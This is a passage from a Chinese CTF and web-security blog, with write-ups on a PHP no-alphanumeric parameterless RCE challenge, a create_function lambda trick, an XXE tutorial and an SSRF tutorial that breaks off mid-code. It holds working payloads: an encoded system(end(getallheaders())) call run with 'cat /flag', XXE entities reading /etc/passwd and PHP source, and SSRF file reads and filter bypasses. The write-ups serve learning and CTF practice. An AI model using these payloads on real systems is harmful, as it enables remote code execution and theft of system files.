<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Your Guojingming&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里有两个正则匹配，用脚本跑出可用字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allow = [];</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">255</span>; $i++)&#123;</span><br><span class="line">    $string =chr($i);</span><br><span class="line">    <span class="keyword">if</span> ( !preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>, $string))&#123;</span><br><span class="line">        $allow[$i]=$string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($allow);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB02cfcc5f4817a8fa5637b341680fd753?method=download&shareKey=71a43cae6a9626174d755814c7722c2f"></p>
<p>这里由于<code>^</code>被过滤，只能用<code>~</code>取反,参考之前写的无字符构造payload</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://zyangtong.github.io/2020/11/30/%E6%97%A0%E5%AD%97%E7%AC%A6webshell/">https://zyangtong.github.io/2020/11/30/%E6%97%A0%E5%AD%97%E7%AC%A6webshell/</a></p>
</blockquote>
<p>而第二个正则匹配不能出现参数，否则无法替换成空，涉及无参数rce</p>
<blockquote>
</blockquote>
<p>通过getallheaders()来读flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders())));</span><br></pre></td></tr></table></figure>

<p>Gq师兄给的 hint ：<code>[&#39;phpinfo&#39;][false]</code>可以构建字符串<code>phpinfo</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBdb7a2b034925d6b337883e6cfe56d674?method=download&shareKey=7a41200321bb45a470eaeee18f4cedff"></p>
<p>所以这道题就是先将函数取反，然后通过<code>[&#39;phpinfo&#39;][false]</code>这种形式嵌套在一起</p>
<p>取反脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; urlencode(~&#39;&#39;);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分别取反构造<code>system(end(getallheaders()));</code></p>
<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure>

<p>用bp抓包在最后请求头添加cat /flag,读到flag</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB8f9ea30a11a017442bb6e1198ef61b1b?method=download&shareKey=64968a1ee84e28d0cc658df4a7e0f42a"></p>
<p>这道题考察了无字符的取反，无参数rce和动态函数构造。</p>
<h1 id="easyphp20201216"><a href="#easyphp20201216" class="headerlink" title="easyphp20201216"></a>easyphp20201216</h1><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&quot;echo(`cat /flag`);&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">     $_GET[<span class="string">&#x27;a&#x27;</span>]();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里出现一个新的函数<code>create_function</code></p>
<blockquote>
<p> create_function()主要用来创建匿名函数 </p>
</blockquote>
<p>官方案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;New anonymous function: <span class="subst">$newfunc</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB56a3e530018ecd9c95aa96f8debcd167?method=download&shareKey=3aa4f71c54f4cebc08b3b719d5d5e2ae"></p>
<p>也就是说等价于下面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span>(<span class="params">$a,$b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . log($a * $b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果直接输出$a如图，会自动生成一个%00lambda_%d</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6a3a9d63019f805fda785068a5c3b028?method=download&shareKey=7f624798f27daa28cf86a6b5841a8023"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28018&#x2F;?a&#x3D;%00lambda_1</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB994de6bb355cf2832d572435648487eb?method=download&shareKey=fa8ce2f7a5bbeed422dc20f758ef24b0"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/22/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">XXE漏洞学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-22</time><div class="content"><p>XXE（XML External Entity），也就是xml外部实体注入 。之前海啸杯有一道题涉及到这个点。</p>
<h1 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h1><p>想学习xxe就得先弄明白什么是xml( 可扩展标记语言 )</p>
<blockquote>
<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
</blockquote>
<p>这是在网上找的一张图，途中包括了xml三个内容<code>XML声明</code>、<code>DTD文档类型定义</code>、<code>文档元素</code>。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB4ea14ba19a67f70242eb4da53a4f1a73?method=download&shareKey=c7077e479882aae14cde2c6c54e4fcf5"></p>
<h2 id="XML声明"><a href="#XML声明" class="headerlink" title="XML声明"></a>XML声明</h2><p>这是最简单的xml声明，version属性是必须的，还有 encoding 属性和 standalone 属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DTD文档类型定义"><a href="#DTD文档类型定义" class="headerlink" title="DTD文档类型定义"></a>DTD文档类型定义</h2><p> DTD的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 </p>
<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>例如这样就是内部声明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>例如这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>然后note.dtd就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h3><ul>
<li>内部实体声明</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>外部实体声明</p>
<p>类似的exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h2><ul>
<li>包括开始标签、元素体（内容）、结束标签。 </li>
</ul>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;gmu&gt;广州航海学院&lt;&#x2F;gmu&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当然也可以是空元素，但注意一定要闭合<code>&lt;gmu/&gt;</code></p>
</li>
<li><p>也可以嵌套</p>
</li>
</ul>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;&lt;b&gt;hello&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h1 id="xxe漏洞使用"><a href="#xxe漏洞使用" class="headerlink" title="xxe漏洞使用"></a>xxe漏洞使用</h1><p>xxe漏洞很危险，可以进行任意文件读取，远程代码执行等</p>
<h2 id="通过DTD内部声明"><a href="#通过DTD内部声明" class="headerlink" title="通过DTD内部声明"></a>通过DTD内部声明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;! ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h2 id="通过DTD外部声明"><a href="#通过DTD外部声明" class="headerlink" title="通过DTD外部声明"></a>通过DTD外部声明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;URL&quot;&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;DTD文件内容</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="引入外部实体声明"><a href="#引入外部实体声明" class="headerlink" title="引入外部实体声明"></a>引入外部实体声明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;URL&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;DTD文件内容</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><strong>海啸杯who are you？</strong></p>
<p>题目源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$data &#x3D; @file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$resp &#x3D; &#39;&#39;;</span><br><span class="line">&#x2F;&#x2F;$flag&#x3D;&#39;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#39;;</span><br><span class="line">if($data !&#x3D; false)&#123;</span><br><span class="line">    $dom &#x3D; new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  &#x3D; $dom-&gt;textContent;</span><br><span class="line">    $resp &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    if ($res)&#123;</span><br><span class="line">        die($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;.&#x2F;style.css&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body class&#x3D;&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method&#x3D;&quot;post&quot; class&#x3D;&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id&#x3D;&quot;title&quot;&gt;请输入姓名&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;name entry &quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot; placeholder&#x3D;&quot;Your Name&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;button class&#x3D;&quot;submit entry&quot; onclick&#x3D;&quot;func()&quot;&gt;Submit&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;shadow&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    function play() &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    function func() &#123;</span><br><span class="line">        &#x2F;&#x2F; document.getElementById().value</span><br><span class="line">        var xml &#x3D; &#39;&#39; +</span><br><span class="line">            &#39;&lt;\?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;\?&gt;&#39; +</span><br><span class="line">            &#39;&lt;feedback&gt;&#39; +</span><br><span class="line">            &#39;&lt;author&gt;&#39; + document.getElementById(&#39;name&#39;).value+ &#39;&lt;&#x2F;author&gt;&#39; +</span><br><span class="line">            &#39;&lt;&#x2F;feedback&gt;&#39;;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        var xmlhttp &#x3D; new XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">            if (xmlhttp.readyState &#x3D;&#x3D; 4) &#123;</span><br><span class="line">                &#x2F;&#x2F; console.log(xmlhttp.readyState);</span><br><span class="line">                &#x2F;&#x2F; console.log(xmlhttp.responseText);</span><br><span class="line">                var res &#x3D; xmlhttp.responseText;</span><br><span class="line">                document.getElementById(&#39;title&#39;).textContent &#x3D; res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(&quot;POST&quot;, &quot;index.php&quot;, true);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE user [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot; &gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB8f1d1aeea5f934b481fc33f595eaf863?method=download&shareKey=a7be3e4ff8f77083b7971d7ce05448f0"></p>
<p>解码</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcb6ee07e871304a4ffe1eb199895507a?method=download&shareKey=54340c1ef88a458af03fbe460a8d1d50"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/21/ssrf%E6%BC%8F%E6%B4%9E/">ssrf漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-21</time><div class="content"><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><blockquote>
<p> **SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 **</p>
</blockquote>
<p> SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;image.php?image&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;a.jpg</span><br></pre></td></tr></table></figure>

<p>例如这样一个URL，原本是服务端请求获取图片数据，但如果存在SSRF漏洞，那就可以用来读文件等等</p>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;image.php?image&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;WINDOWS&#x2F;win.ini</span><br></pre></td></tr></table></figure>



<h1 id="SSRF漏洞寻找"><a href="#SSRF漏洞寻找" class="headerlink" title="SSRF漏洞寻找"></a>SSRF漏洞寻找</h1><p>一般来说调外部资源的参数都有可能存在ssrf漏洞，如果源码中有 <code>file_get_contents()</code>、<code>curl()</code>、<code>fsocksopen()</code>、<code>fopen()</code> 这几个函数那大概率就存在ssrf漏洞，ssrf入口一般有通过URL地址分享网页内容、 通过URL地址加载或下载图片，总而言之需要调用外部资源的地方就有可能出现ssrf漏洞。</p>
<h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="data伪协议构造绕过"><a href="#data伪协议构造绕过" class="headerlink" title="data伪协议构造绕过"></a>data伪协议构造绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|file|\/\/|sftp|ldap|gopher|http|https/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">   $a = file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">   <span class="keyword">eval</span>($a);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里将许多函数过滤，把双斜杆也过滤了，而data伪协议是没有斜杆的，考虑用data伪协议来构造绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;data:text&#x2F;plain;base64,cGhwaW5mbygpOw&#x3D;&#x3D;   &#x2F;&#x2F;这里cGhwaW5mbygpOw&#x3D;&#x3D;解码后就是phpinfo()</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB1a4243f1c9ee7007945196d385851202?method=download&shareKey=58fad0e67eb8f15193da8d1d26786c93"></p>
<h2 id="IP限制绕过"><a href="#IP限制绕过" class="headerlink" title="IP限制绕过"></a>IP限制绕过</h2><p>有些地方将127.0.0.1给ban，或者将某一个特定的ip给ban了，而我们却恰恰需要通过这个ip来访问，这是我们就可以用集中方法来绕过</p>
<h3 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h3><p>如果我们需要访问127.0.0.1，而它被ban掉了，那我们可以用localhost来替换绕过限制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^(http:\/\/)?([^\/]+)/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^http:\/\/127\.0\.0\.1/&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span 